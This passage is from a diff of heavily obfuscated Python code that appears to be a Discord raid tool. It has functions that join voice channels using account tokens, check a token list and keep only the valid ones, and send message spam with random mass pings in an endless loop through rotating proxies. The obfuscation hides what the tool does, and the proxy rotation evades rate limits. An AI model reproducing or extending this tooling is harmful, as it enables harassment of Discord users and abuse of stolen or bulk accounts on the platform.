𝘭𝙈𝘕𝙡𝗡𝙡𝙈𝙄𝘔𝗜𝘔[249]}")
             return False
     except:
         pass
 
 def vc_joiner(token, guild, channel):
-    𝗱𝘯 = 𝘁𝗼𝗸𝗲𝘯.split(𝙉𝙈𝗠𝙈𝙉𝘭𝘭𝙈𝘔𝗹𝗠𝗠𝗡𝘭𝗜𝗠𝘐𝘐𝙉𝙈𝙄𝙄𝙈𝘐𝗹𝘐𝗡𝗜𝘔𝗜𝙄𝘔[254])
-    𝘯𝗻 = 𝙙𝗻[0]
-    for _ in 𝙧𝘢𝘯𝙜𝗲(1):
-        𝘸𝘴 = 𝙒𝙚𝙗𝙎𝘰𝗰𝗸𝗲𝙩()
-        𝘸𝘀.connect(𝗡𝗠𝙈𝘔𝗡𝗹𝙡𝗠𝘔𝙡𝘔𝘔𝙉𝘭𝘐𝘔𝗜𝙄𝗡𝙈𝘐𝘐𝗠𝗜𝘭𝗜𝙉𝙄𝘔𝙄𝗜𝙈[259])
-        𝘄𝘴.send(𝙟𝘴𝗼𝙣.dumps({𝗡𝘔𝗠𝗠𝗡𝗹𝘭𝘔𝗠𝗹𝗠𝘔𝘕𝗹𝙄𝗠𝘐𝘐𝘕𝘔𝗜𝗜𝗠𝙄𝘭𝘐𝗡𝗜𝘔𝗜𝗜𝗠[176]: 2, 𝙉𝙈𝗠𝙈𝙉𝙡𝙡𝘔𝗠𝘭𝘔𝗠𝗡𝘭𝙄𝙈𝘐𝙄𝗡𝙈𝙄𝗜𝗠𝗜𝙡𝙄𝙉𝘐𝗠𝘐𝗜𝘔[173]: {𝗡𝘔𝙈𝙈𝗡𝘭𝙡𝗠𝗠𝘭𝗠𝗠𝗡𝗹𝘐𝘔𝗜𝘐𝗡𝗠𝗜𝙄𝘔𝘐𝘭𝘐𝘕𝗜𝘔𝙄𝙄𝙈[260]: 𝙩𝙤𝙠𝘦𝘯, 𝘕𝙈𝘔𝘔𝗡𝘭𝗹𝗠𝗠𝗹𝗠𝙈𝘕𝗹𝗜𝗠𝗜𝙄𝘕𝗠𝙄𝘐𝙈𝙄𝘭𝙄𝙉𝙄𝗠𝘐𝙄𝘔[261]: {𝘕𝗠𝗠𝙈𝗡𝙡𝙡𝙈𝘔𝙡𝙈𝗠𝙉𝘭𝙄𝙈𝙄𝘐𝘕𝘔𝙄𝘐𝘔𝗜𝗹𝙄𝗡𝗜𝙈𝘐𝙄𝙈[262]: 𝘕𝙈𝘔𝗠𝗡𝙡𝙡𝙈𝗠𝘭𝘔𝘔𝙉𝙡𝘐𝘔𝗜𝘐𝙉𝙈𝘐𝘐𝙈𝘐𝗹𝙄𝗡𝗜𝘔𝗜𝙄𝙈[265], 𝘕𝗠𝙈𝗠𝗡𝘭𝗹𝙈𝗠𝙡𝘔𝙈𝘕𝗹𝗜𝗠𝗜𝗜𝗡𝙈𝗜𝙄𝘔𝗜𝙡𝙄𝘕𝘐𝘔𝙄𝙄𝗠[263]: 𝙉𝘔𝙈𝘔𝘕𝘭𝙡𝗠𝙈𝙡𝗠𝘔𝗡𝙡𝗜𝗠𝙄𝘐𝘕𝙈𝙄𝗜𝙈𝗜𝙡𝗜𝗡𝗜𝙈𝘐𝙄𝘔[266], 𝗡𝘔𝗠𝘔𝙉𝗹𝗹𝙈𝙈𝘭𝘔𝘔𝗡𝗹𝘐𝙈𝙄𝘐𝗡𝙈𝙄𝘐𝙈𝘐𝗹𝙄𝘕𝘐𝗠𝙄𝙄𝙈[264]: 𝙉𝘔𝙈𝙈𝘕𝗹𝙡𝙈𝗠𝗹𝙈𝘔𝘕𝗹𝙄𝗠𝘐𝙄𝙉𝘔𝘐𝘐𝙈𝙄𝙡𝘐𝘕𝗜𝗠𝘐𝘐𝙈[267]}}}))
-        𝘄𝙨.send(𝙟𝘴𝗼𝗻.dumps({𝘕𝙈𝗠𝘔𝙉𝗹𝘭𝘔𝗠𝙡𝗠𝘔𝘕𝘭𝙄𝗠𝙄𝗜𝙉𝗠𝗜𝘐𝙈𝗜𝙡𝘐𝙉𝘐𝗠𝙄𝗜𝙈[176]: 4, 𝙉𝘔𝙈𝗠𝙉𝙡𝗹𝗠𝙈𝘭𝘔𝗠𝗡𝘭𝙄𝙈𝘐𝗜𝘕𝙈𝗜𝘐𝙈𝘐𝙡𝙄𝙉𝗜𝘔𝘐𝘐𝗠[173]: {𝙉𝙈𝗠𝙈𝗡𝘭𝗹𝙈𝗠𝙡𝙈𝘔𝘕𝗹𝙄𝗠𝘐𝙄𝙉𝙈𝙄𝙄𝗠𝙄𝗹𝙄𝗡𝗜𝗠𝘐𝘐𝙈[168]: 𝘨𝘂𝙞𝘭𝗱, 𝙉𝘔𝗠𝗠𝙉𝘭𝗹𝗠𝙈𝘭𝙈𝙈𝙉𝘭𝙄𝗠𝙄𝙄𝙉𝘔𝙄𝗜𝘔𝗜𝙡𝙄𝗡𝘐𝙈𝘐𝗜𝗠[268]: 𝘤𝘩𝘢𝘯𝘯𝗲𝘭, 𝘕𝘔𝗠𝗠𝙉𝗹𝙡𝙈𝗠𝗹𝗠𝙈𝘕𝗹𝘐𝙈𝙄𝘐𝘕𝙈𝙄𝙄𝗠𝗜𝗹𝙄𝘕𝙄𝘔𝙄𝗜𝙈[269]: False, 𝙉𝗠𝗠𝗠𝘕𝘭𝗹𝘔𝙈𝘭𝘔𝘔𝙉𝗹𝘐𝘔𝗜𝗜𝘕𝗠𝙄𝘐𝗠𝘐𝙡𝗜𝘕𝘐𝗠𝗜𝘐𝗠[270]: False}}))
-        𝘱𝗿𝘪𝗻𝘵(f"{𝗿}{𝗡𝗠𝘔𝗠𝘕𝙡𝙡𝗠𝗠𝘭𝙈𝙈𝘕𝙡𝗜𝙈𝙄𝘐𝙉𝙈𝘐𝘐𝗠𝙄𝙡𝙄𝗡𝙄𝗠𝘐𝘐𝘔[98]}{𝗱𝘢𝘵𝗲𝘁𝘪𝙢𝙚.datetime.now().strftime(f'{𝙜}{𝙉𝙈𝗠𝘔𝗡𝘭𝗹𝙈𝗠𝙡𝗠𝗠𝙉𝗹𝙄𝘔𝘐𝙄𝗡𝗠𝗜𝘐𝘔𝗜𝙡𝘐𝘕𝙄𝙈𝘐𝙄𝗠[99]}{𝗿}')}{𝗡𝗠𝗠𝗠𝙉𝙡𝗹𝙈𝘔𝘭𝗠𝗠𝙉𝙡𝙄𝙈𝘐𝘐𝗡𝗠𝙄𝘐𝙈𝗜𝗹𝘐𝘕𝘐𝗠𝙄𝘐𝙈[100]}{𝘳}{𝙉𝗠𝙈𝙈𝗡𝘭𝗹𝗠𝗠𝙡𝗠𝘔𝙉𝗹𝗜𝘔𝘐𝘐𝙉𝙈𝘐𝙄𝘔𝗜𝘭𝗜𝘕𝙄𝙈𝘐𝗜𝙈[98]}{𝘭𝗰}{𝗡𝗠𝗠𝙈𝗡𝘭𝗹𝙈𝘔𝗹𝘔𝘔𝘕𝘭𝗜𝙈𝙄𝙄𝘕𝙈𝙄𝙄𝗠𝙄𝙡𝘐𝙉𝘐𝘔𝘐𝙄𝗠[271]}{𝘳}{𝙉𝙈𝘔𝙈𝗡𝘭𝗹𝙈𝙈𝘭𝗠𝙈𝙉𝘭𝗜𝙈𝘐𝘐𝘕𝙈𝘐𝗜𝘔𝙄𝙡𝘐𝙉𝗜𝘔𝘐𝗜𝙈[100]}{𝙣𝗻}{𝗴}{𝗡𝗠𝗠𝘔𝙉𝙡𝘭𝘔𝗠𝙡𝘔𝙈𝗡𝘭𝘐𝗠𝙄𝘐𝘕𝘔𝗜𝙄𝙈𝙄𝘭𝗜𝙉𝘐𝘔𝘐𝗜𝘔[256]}")
+    𝙙𝘯 = 𝘵𝘰𝘬𝙚𝙣.split(𝗜𝙉𝙄𝘕𝙡𝗹𝙄𝘔𝘐𝙄𝗹𝘔𝙡𝗹𝗜𝗹𝘭𝗡𝗡𝘐𝘭𝙡𝘔𝘕𝘭𝗡𝗹𝘔𝘐𝙈𝘐𝙈[247])
+    𝙣𝗻 = 𝘥𝙣[0]
+    for _ in 𝗿𝘢𝘯𝘨𝙚(1):
+        𝙬𝘴 = 𝗪𝙚𝘣𝙎𝙤𝙘𝙠𝘦𝘁()
+        𝙬𝘴.connect(𝘐𝗡𝙄𝗡𝗹𝘭𝗜𝙈𝙄𝗜𝗹𝗠𝙡𝗹𝗜𝗹𝘭𝘕𝙉𝘐𝙡𝘭𝘔𝙉𝙡𝘕𝘭𝘔𝗜𝗠𝘐𝘔[252])
+        𝙬𝙨.send(𝗷𝙨𝙤𝗻.dumps({𝘐𝗡𝗜𝙉𝘭𝗹𝗜𝙈𝘐𝘐𝙡𝙈𝗹𝘭𝗜𝘭𝙡𝙉𝘕𝘐𝗹𝘭𝗠𝙉𝘭𝘕𝙡𝙈𝘐𝙈𝘐𝘔[169]: 2, 𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝘐𝗜𝘭𝘔𝙡𝘭𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝙈𝘕𝙡𝘕𝙡𝗠𝘐𝘔𝗜𝗠[166]: {𝗜𝗡𝘐𝘕𝙡𝙡𝙄𝘔𝗜𝘐𝙡𝘔𝙡𝙡𝗜𝘭𝗹𝗡𝙉𝗜𝙡𝗹𝗠𝙉𝙡𝗡𝘭𝘔𝙄𝘔𝙄𝘔[253]: 𝘵𝘰𝘬𝘦𝘯, 𝙄𝙉𝗜𝗡𝗹𝗹𝘐𝘔𝙄𝘐𝗹𝗠𝙡𝘭𝘐𝙡𝙡𝙉𝘕𝘐𝗹𝗹𝘔𝘕𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝘔[254]: {𝘐𝙉𝗜𝘕𝙡𝘭𝘐𝘔𝗜𝗜𝙡𝙈𝙡𝗹𝘐𝗹𝘭𝗡𝙉𝙄𝘭𝙡𝘔𝘕𝙡𝘕𝗹𝘔𝘐𝗠𝗜𝙈[255]: 𝗜𝗡𝙄𝗡𝙡𝘭𝙄𝗠𝙄𝗜𝙡𝙈𝗹𝙡𝙄𝗹𝗹𝘕𝗡𝗜𝙡𝗹𝗠𝗡𝗹𝙉𝘭𝗠𝙄𝗠𝗜𝙈[258], 𝙄𝘕𝘐𝘕𝗹𝙡𝘐𝘔𝙄𝙄𝗹𝗠𝗹𝘭𝗜𝗹𝗹𝘕𝘕𝙄𝗹𝙡𝙈𝘕𝙡𝘕𝘭𝘔𝘐𝗠𝘐𝙈[256]: 𝗜𝙉𝘐𝘕𝘭𝗹𝙄𝗠𝘐𝘐𝙡𝗠𝘭𝙡𝗜𝙡𝗹𝘕𝘕𝗜𝘭𝙡𝙈𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝗜𝘔[259], 𝗜𝘕𝙄𝗡𝗹𝙡𝗜𝘔𝘐𝗜𝙡𝙈𝙡𝘭𝙄𝗹𝙡𝘕𝙉𝗜𝗹𝗹𝘔𝘕𝗹𝙉𝘭𝗠𝘐𝗠𝘐𝘔[257]: 𝘐𝘕𝗜𝙉𝗹𝗹𝗜𝙈𝙄𝙄𝘭𝘔𝗹𝙡𝗜𝙡𝙡𝙉𝗡𝘐𝘭𝘭𝘔𝗡𝙡𝘕𝗹𝗠𝗜𝘔𝗜𝘔[260]}}}))
+        𝘸𝙨.send(𝙟𝘀𝙤𝗻.dumps({𝗜𝘕𝙄𝘕𝗹𝙡𝗜𝗠𝙄𝗜𝘭𝗠𝘭𝙡𝙄𝗹𝗹𝘕𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝗡𝙡𝗠𝘐𝗠𝗜𝗠[169]: 4, 𝘐𝗡𝙄𝙉𝗹𝙡𝗜𝗠𝘐𝙄𝙡𝙈𝘭𝗹𝘐𝘭𝙡𝗡𝙉𝘐𝘭𝗹𝗠𝘕𝙡𝘕𝘭𝘔𝗜𝙈𝘐𝙈[166]: {𝘐𝘕𝘐𝙉𝙡𝗹𝘐𝘔𝘐𝙄𝘭𝘔𝙡𝘭𝙄𝘭𝙡𝙉𝗡𝗜𝙡𝙡𝙈𝘕𝘭𝙉𝙡𝙈𝘐𝘔𝘐𝘔[161]: 𝙜𝘂𝘪𝘭𝘥, 𝙄𝙉𝗜𝗡𝗹𝗹𝗜𝙈𝙄𝙄𝗹𝘔𝘭𝙡𝙄𝗹𝘭𝗡𝗡𝗜𝗹𝙡𝘔𝗡𝙡𝙉𝗹𝗠𝗜𝘔𝗜𝗠[261]: 𝗰𝙝𝘢𝗻𝘯𝙚𝙡, 𝙄𝘕𝘐𝙉𝙡𝗹𝘐𝗠𝗜𝗜𝗹𝘔𝘭𝘭𝙄𝙡𝗹𝘕𝗡𝙄𝙡𝗹𝗠𝘕𝙡𝗡𝘭𝘔𝗜𝙈𝗜𝘔[262]: False, 𝗜𝙉𝘐𝗡𝗹𝗹𝙄𝘔𝙄𝙄𝗹𝗠𝙡𝘭𝗜𝗹𝙡𝗡𝘕𝙄𝗹𝗹𝘔𝗡𝙡𝙉𝘭𝗠𝙄𝘔𝗜𝘔[263]: False}}))
+        𝙥𝗿𝙞𝗻𝘵(f"{𝗿}{𝙄𝙉𝙄𝗡𝗹𝘭𝗜𝘔𝗜𝘐𝗹𝘔𝗹𝘭𝘐𝙡𝗹𝙉𝗡𝙄𝗹𝙡𝗠𝗡𝗹𝘕𝙡𝗠𝗜𝘔𝙄𝗠[91]}{𝙙𝙖𝙩𝘦𝘁𝙞𝙢𝘦.datetime.now().strftime(f'{𝘨}{𝘐𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝙄𝙡𝙈𝗹𝗹𝗜𝗹𝗹𝗡𝘕𝘐𝘭𝗹𝘔𝙉𝙡𝘕𝘭𝗠𝗜𝘔𝗜𝙈[92]}{𝘳}')}{𝙄𝗡𝙄𝗡𝙡𝙡𝗜𝗠𝗜𝗜𝙡𝗠𝘭𝙡𝙄𝙡𝙡𝘕𝗡𝙄𝗹𝗹𝘔𝗡𝗹𝙉𝗹𝗠𝘐𝗠𝘐𝘔[93]}{𝗿}{𝙄𝙉𝙄𝗡𝘭𝗹𝙄𝘔𝙄𝘐𝙡𝙈𝗹𝘭𝙄𝗹𝗹𝗡𝙉𝙄𝘭𝙡𝘔𝗡𝘭𝙉𝘭𝗠𝙄𝙈𝗜𝘔[91]}{𝗹𝘤}{𝙄𝙉𝗜𝗡𝙡𝗹𝗜𝗠𝗜𝙄𝙡𝘔𝘭𝙡𝙄𝙡𝗹𝗡𝙉𝗜𝗹𝙡𝙈𝘕𝙡𝘕𝘭𝗠𝘐𝘔𝘐𝙈[264]}{𝘳}{𝗜𝙉𝗜𝘕𝘭𝙡𝗜𝘔𝗜𝘐𝘭𝗠𝗹𝙡𝙄𝘭𝙡𝗡𝙉𝗜𝙡𝗹𝙈𝙉𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝗠[93]}{𝙣𝙣}{𝗴}{𝘐𝗡𝗜𝗡𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝙈𝙡𝘭𝘐𝗹𝙡𝙉𝘕𝗜𝙡𝘭𝙈𝘕𝙡𝗡𝗹𝙈𝘐𝘔𝘐𝙈[249]}")
 
 def save_tokens(file_path):
-    𝘷𝘢𝘭𝘪𝗱_𝘵𝘰𝙠𝗲𝗻𝘀 = 0
-    𝘵𝘰𝗸𝙚𝘯𝘴_𝙫𝙖𝙡𝘪𝘥 = []
-    𝘵𝗼𝗸𝗲𝘯𝘴 = 𝘰𝙥𝙚𝙣(𝘧𝗶𝗹𝗲_𝗽𝗮𝘁𝙝, 𝘕𝘔𝘔𝙈𝙉𝗹𝙡𝗠𝙈𝙡𝘔𝙈𝙉𝙡𝗜𝘔𝗜𝗜𝙉𝘔𝘐𝗜𝘔𝘐𝘭𝘐𝙉𝗜𝙈𝘐𝙄𝘔[37]).read().splitlines()
-    for 𝙩𝙤𝗸𝙚𝙣 in 𝘁𝗼𝗸𝙚𝗻𝙨:
-        if 𝗰𝙝𝘦𝘤𝘬_𝘵𝗼𝘬𝘦𝙣(𝙩𝗼𝗸𝘦𝙣):
-            𝙫𝙖𝘭𝗶𝙙_𝘁𝘰𝙠𝗲𝙣𝘴 += 1
-            𝘁𝘰𝗸𝙚𝘯𝘴_𝙫𝘢𝘭𝗶𝙙.append(𝘁𝙤𝗸𝙚𝘯)
-    with 𝙤𝗽𝗲𝙣(𝗳𝗶𝗹𝘦_𝙥𝘢𝘵𝘩, 𝘕𝘔𝗠𝙈𝙉𝘭𝙡𝘔𝘔𝗹𝙈𝘔𝗡𝘭𝘐𝗠𝗜𝙄𝙉𝙈𝗜𝘐𝗠𝙄𝙡𝙄𝙉𝙄𝙈𝙄𝘐𝙈[220]) as 𝗳:
-        𝘧.truncate(0)
-    with 𝗼𝘱𝗲𝙣(𝙛𝗶𝘭𝘦_𝘱𝗮𝙩𝙝, 𝗡𝘔𝗠𝘔𝙉𝙡𝙡𝘔𝘔𝗹𝙈𝗠𝘕𝗹𝗜𝙈𝙄𝗜𝗡𝗠𝘐𝗜𝙈𝘐𝗹𝘐𝗡𝙄𝗠𝗜𝗜𝙈[222]) as 𝗳:
-        for 𝘁𝘰𝙠𝗲𝙣 in 𝙩𝗼𝗸𝘦𝘯𝘴_𝘷𝘢𝙡𝗶𝘥:
-            𝗳.write(𝘵𝘰𝗸𝘦𝙣 + 𝗡𝗠𝗠𝗠𝗡𝘭𝗹𝗠𝙈𝘭𝗠𝙈𝗡𝙡𝘐𝘔𝙄𝘐𝗡𝘔𝘐𝘐𝗠𝙄𝗹𝗜𝗡𝘐𝗠𝙄𝘐𝘔[70])
+    𝘃𝙖𝙡𝙞𝙙_𝙩𝘰𝙠𝘦𝘯𝙨 = 0
+    𝙩𝙤𝙠𝗲𝗻𝘴_𝘷𝘢𝘭𝗶𝗱 = []
+    𝘁𝙤𝗸𝘦𝗻𝘀 = 𝙤𝙥𝗲𝙣(𝙛𝙞𝗹𝗲_𝙥𝘢𝘵𝘩, 𝙄𝘕𝙄𝗡𝘭𝘭𝘐𝙈𝗜𝗜𝙡𝗠𝘭𝘭𝗜𝘭𝙡𝗡𝘕𝘐𝘭𝘭𝙈𝗡𝙡𝘕𝗹𝙈𝗜𝙈𝗜𝙈[30]).read().splitlines()
+    for 𝘁𝗼𝗸𝘦𝙣 in 𝘁𝙤𝘬𝙚𝗻𝘴:
+        if 𝘤𝙝𝙚𝘤𝗸_𝙩𝘰𝙠𝗲𝗻(𝘁𝘰𝗸𝘦𝗻):
+            𝙫𝗮𝙡𝗶𝘥_𝘁𝙤𝙠𝘦𝙣𝙨 += 1
+            𝙩𝗼𝗸𝙚𝙣𝙨_𝘃𝘢𝗹𝗶𝘥.append(𝘁𝘰𝗸𝗲𝘯)
+    with 𝙤𝘱𝗲𝗻(𝘧𝘪𝘭𝙚_𝗽𝘢𝘵𝗵, 𝘐𝘕𝗜𝘕𝘭𝗹𝗜𝘔𝗜𝘐𝗹𝘔𝙡𝘭𝙄𝘭𝗹𝘕𝙉𝗜𝙡𝘭𝗠𝘕𝗹𝗡𝗹𝗠𝙄𝙈𝗜𝙈[213]) as 𝘧:
+        𝗳.truncate(0)
+    with 𝗼𝗽𝙚𝗻(𝘧𝘪𝙡𝗲_𝙥𝗮𝙩𝗵, 𝙄𝗡𝘐𝗡𝗹𝘭𝗜𝘔𝘐𝙄𝗹𝗠𝙡𝙡𝗜𝘭𝗹𝗡𝘕𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝗹𝘔𝙄𝗠𝘐𝘔[215]) as 𝗳:
+        for 𝘁𝘰𝗸𝗲𝙣 in 𝘵𝙤𝗸𝗲𝘯𝙨_𝘃𝗮𝙡𝘪𝙙:
+            𝘧.write(𝙩𝘰𝘬𝗲𝗻 + 𝗜𝗡𝙄𝗡𝘭𝘭𝙄𝘔𝗜𝗜𝗹𝗠𝗹𝗹𝘐𝗹𝙡𝗡𝙉𝘐𝙡𝘭𝙈𝘕𝗹𝗡𝘭𝙈𝙄𝗠𝗜𝙈[63])
 
 def massping(token, channel, message, delay, pings):
-    𝙝𝗲𝘢𝘥𝙚𝗿𝙨 = 𝘏𝘦𝘢𝙙𝗲𝘳𝘴(𝘁𝙤𝘬𝙚𝘯)
+    𝙝𝙚𝘢𝘥𝙚𝙧𝘀 = 𝙃𝗲𝗮𝙙𝘦𝘳𝘀(𝘵𝘰𝗸𝙚𝘯)
     while True:
-        𝗱𝗻 = 𝘁𝗼𝗸𝙚𝙣.split(𝙉𝗠𝙈𝗠𝘕𝙡𝗹𝗠𝗠𝙡𝙈𝙈𝙉𝙡𝗜𝙈𝙄𝘐𝙉𝘔𝘐𝘐𝘔𝗜𝗹𝙄𝘕𝗜𝘔𝘐𝙄𝗠[254])
-        𝙣𝙣 = 𝙙𝙣[0]
-        𝗱𝙖𝘵𝘢 = {𝘕𝙈𝙈𝙈𝘕𝙡𝘭𝘔𝘔𝘭𝗠𝗠𝙉𝙡𝙄𝗠𝙄𝙄𝗡𝗠𝘐𝙄𝗠𝘐𝙡𝗜𝗡𝗜𝙈𝘐𝙄𝙈[272]: f'{𝗺𝙚𝙨𝘀𝘢𝙜𝘦}{𝗡𝘔𝘔𝗠𝗡𝙡𝗹𝙈𝙈𝙡𝙈𝙈𝘕𝘭𝘐𝘔𝘐𝗜𝗡𝗠𝙄𝗜𝗠𝘐𝘭𝘐𝗡𝘐𝗠𝙄𝗜𝗠[105]}{𝘨𝘦𝙩𝘳𝘢𝗻𝗱𝙤𝙢𝘪𝙙𝘀(𝗥𝘶𝙫𝘁𝙬𝘟𝙇𝘆_𝙌𝙧𝙌20𝘝𝗙633𝙄𝗝𝘌𝘅𝘾𝗘𝗹𝗵𝙠𝗼𝙓𝘪𝗚.mro()[10](𝗽𝗶𝙣𝗴𝙨))}'}
-        𝘀𝘭𝘦𝘦𝗽(𝘥𝙚𝘭𝘢𝘆)
-        if 𝗽𝘳𝙤𝘅𝘺:
-            𝗿𝙧 = 𝗿𝙚𝗾𝘶𝘦𝙨𝙩𝘀.post(f'{𝘕𝙈𝙈𝘔𝙉𝘭𝗹𝙈𝙈𝙡𝗠𝗠𝘕𝗹𝘐𝗠𝗜𝘐𝙉𝘔𝗜𝙄𝙈𝙄𝗹𝗜𝗡𝗜𝗠𝘐𝙄𝘔[273]}{𝗰𝗵𝙖𝘯𝘯𝗲𝙡}{𝗡𝙈𝗠𝗠𝙉𝗹𝗹𝘔𝘔𝙡𝗠𝗠𝗡𝙡𝘐𝘔𝘐𝙄𝙉𝘔𝘐𝙄𝘔𝗜𝙡𝙄𝘕𝙄𝙈𝗜𝗜𝙈[274]}', headers=𝗵𝙚𝙖𝙙𝙚𝘳𝘀, json=𝘥𝘢𝘵𝗮, proxy={𝙉𝙈𝙈𝙈𝘕𝙡𝗹𝘔𝘔𝙡𝙈𝙈𝗡𝙡𝙄𝘔𝗜𝘐𝘕𝗠𝘐𝗜𝘔𝘐𝘭𝘐𝘕𝙄𝘔𝙄𝘐𝙈[251]: 𝙉𝗠𝘔𝗠𝙉𝙡𝗹𝗠𝙈𝗹𝙈𝙈𝘕𝘭𝗜𝗠𝘐𝘐𝙉𝘔𝘐𝘐𝙈𝗜𝘭𝗜𝘕𝗜𝘔𝘐𝘐𝗠[253] + 𝘳𝗮𝙣𝘥𝘰𝘮.choice(𝗽𝗿𝘰𝘹𝘪𝙚𝘴), 𝘕𝗠𝘔𝘔𝗡𝙡𝗹𝙈𝘔𝙡𝗠𝙈𝘕𝗹𝘐𝘔𝙄𝗜𝗡𝙈𝘐𝘐𝘔𝘐𝘭𝙄𝙉𝙄𝙈𝙄𝙄𝘔[252]: 𝘕𝘔𝗠𝙈𝗡𝘭𝙡𝘔𝗠𝙡𝗠𝙈𝗡𝘭𝗜𝙈𝗜𝗜𝘕𝗠𝘐𝘐𝘔𝙄𝗹𝙄𝙉𝙄𝙈𝗜𝙄𝘔[253] + 𝙧𝘢𝙣𝙙𝗼𝘮.choice(𝘱𝙧𝗼𝘅𝘪𝘦𝘀)})
+        𝘥𝙣 = 𝘁𝗼𝗸𝗲𝗻.split(𝘐𝗡𝗜𝗡𝙡𝘭𝙄𝘔𝙄𝘐𝙡𝙈𝗹𝗹𝙄𝘭𝗹𝙉𝘕𝗜𝘭𝗹𝘔𝗡𝗹𝗡𝗹𝙈𝘐𝗠𝘐𝘔[247])
+        𝗻𝗻 = 𝙙𝘯[0]
+        𝘥𝙖𝙩𝗮 = {𝙄𝙉𝘐𝗡𝘭𝙡𝘐𝙈𝗜𝙄𝙡𝗠𝘭𝙡𝗜𝗹𝘭𝙉𝘕𝘐𝙡𝙡𝘔𝗡𝙡𝙉𝘭𝗠𝗜𝙈𝙄𝘔[265]: f'{𝗺𝗲𝘀𝘀𝗮𝘨𝗲}{𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝙈𝙄𝙄𝙡𝗠𝙡𝗹𝗜𝗹𝙡𝘕𝙉𝘐𝘭𝗹𝙈𝙉𝘭𝗡𝙡𝘔𝙄𝙈𝙄𝗠[98]}{𝗴𝙚𝘁𝘳𝙖𝘯𝗱𝗼𝘮𝘪𝗱𝘀(𝙬𝘂𝘾8𝗯𝙯𝙣9𝘭𝙦9𝗖𝗞𝘽𝘌𝘗𝙆𝗹𝘰𝗸𝙏𝘠𝘐9𝘿𝘋1𝘚𝘦𝘕𝙛𝘩.mro()[9](𝙥𝘪𝙣𝙜𝘀))}'}
+        𝘴𝙡𝙚𝗲𝗽(𝙙𝗲𝗹𝗮𝙮)
+        if 𝘱𝘳𝗼𝘹𝙮:
+            𝘳𝘳 = 𝘳𝘦𝘲𝙪𝙚𝘴𝘵𝙨.post(f'{𝗜𝙉𝗜𝙉𝙡𝙡𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝘭𝙄𝘭𝙡𝘕𝘕𝗜𝙡𝙡𝗠𝗡𝘭𝘕𝘭𝙈𝙄𝘔𝘐𝘔[266]}{𝗰𝗵𝗮𝙣𝗻𝗲𝘭}{𝘐𝘕𝗜𝘕𝙡𝘭𝙄𝗠𝗜𝙄𝙡𝘔𝗹𝗹𝙄𝙡𝘭𝗡𝘕𝘐𝘭𝘭𝘔𝗡𝗹𝙉𝙡𝙈𝘐𝘔𝙄𝘔[267]}', headers=𝘩𝙚𝙖𝗱𝗲𝘳𝘴, json=𝗱𝙖𝘁𝘢, proxy={𝗜𝗡𝘐𝗡𝘭𝘭𝙄𝗠𝙄𝗜𝗹𝘔𝙡𝙡𝘐𝘭𝙡𝘕𝙉𝗜𝙡𝘭𝙈𝗡𝙡𝘕𝗹𝙈𝘐𝘔𝘐𝗠[244]: 𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝙈𝙄𝗜𝗹𝙈𝙡𝙡𝗜𝘭𝙡𝘕𝙉𝙄𝙡𝗹𝙈𝙉𝙡𝗡𝘭𝘔𝗜𝗠𝗜𝙈[246] + 𝙧𝘢𝘯𝘥𝗼𝙢.choice(𝘱𝘳𝘰𝘹𝘪𝘦𝘴), 𝘐𝘕𝘐𝗡𝗹𝘭𝙄𝗠𝙄𝘐𝗹𝗠𝘭𝙡𝗜𝘭𝗹𝙉𝘕𝙄𝙡𝘭𝗠𝙉𝘭𝗡𝘭𝙈𝙄𝘔𝙄𝗠[245]: 𝘐𝗡𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝗹𝘭𝙄𝙡𝘭𝗡𝙉𝙄𝙡𝘭𝗠𝗡𝙡𝙉𝙡𝘔𝘐𝗠𝗜𝘔[246] + 𝙧𝘢𝘯𝗱𝘰𝙢.choice(𝘱𝗿𝘰𝘅𝙞𝘦𝘀)})
         else:
-            𝙧𝘳 = 𝘳𝘦𝗾𝘂𝘦𝘴𝘁𝙨.post(f'{𝙉𝙈𝙈𝙈𝗡𝙡𝘭𝙈𝘔𝙡𝘔𝗠𝘕𝘭𝘐𝙈𝗜𝗜𝙉𝘔𝙄𝙄𝗠𝘐𝙡𝘐𝘕𝘐𝙈𝗜𝗜𝙈[273]}{𝘤𝗵𝙖𝙣𝙣𝗲𝘭}{𝗡𝘔𝙈𝘔𝘕𝘭𝗹𝙈𝗠𝘭𝘔𝙈𝘕𝙡𝘐𝗠𝘐𝙄𝘕𝘔𝗜𝘐𝙈𝙄𝗹𝗜𝙉𝗜𝘔𝗜𝗜𝗠[274]}', headers=𝘩𝙚𝙖𝘥𝗲𝘳𝘀, json=𝘥𝘢𝘁𝘢)
-        if 𝙧𝗿.status_code == 200:
-            𝘱𝙧𝙞𝗻𝘵(f"{𝘳}{𝙉𝙈𝙈𝘔𝙉𝙡𝙡𝘔𝗠𝘭𝗠𝙈𝘕𝗹𝗜𝙈𝗜𝙄𝘕𝙈𝘐𝘐𝙈𝙄𝙡𝘐𝙉𝗜𝙈𝗜𝗜𝘔[98]}{𝗱𝘢𝙩𝗲𝘵𝘪𝙢𝙚.datetime.now().strftime(f'{𝙜}{𝘕𝗠𝘔𝙈𝙉𝙡𝗹𝙈𝘔𝙡𝙈𝗠𝘕𝗹𝙄𝘔𝗜𝙄𝙉𝙈𝗜𝙄𝗠𝙄𝗹𝙄𝗡𝘐𝙈𝙄𝙄𝗠[99]}{𝘳}')}{𝗡𝗠𝙈𝘔𝙉𝙡𝘭𝗠𝙈𝗹𝙈𝙈𝗡𝙡𝘐𝙈𝗜𝙄𝗡𝘔𝗜𝙄𝗠𝙄𝗹𝘐𝙉𝗜𝘔𝘐𝘐𝙈[100]}{𝙧}{𝙉𝙈𝗠𝘔𝘕𝘭𝗹𝙈𝗠𝙡𝘔𝗠𝙉𝗹𝙄𝘔𝙄𝙄𝙉𝗠𝗜𝘐𝗠𝙄𝘭𝗜𝗡𝗜𝗠𝗜𝙄𝗠[98]}{𝗹𝘤}{𝗡𝗠𝘔𝗠𝗡𝗹𝙡𝘔𝙈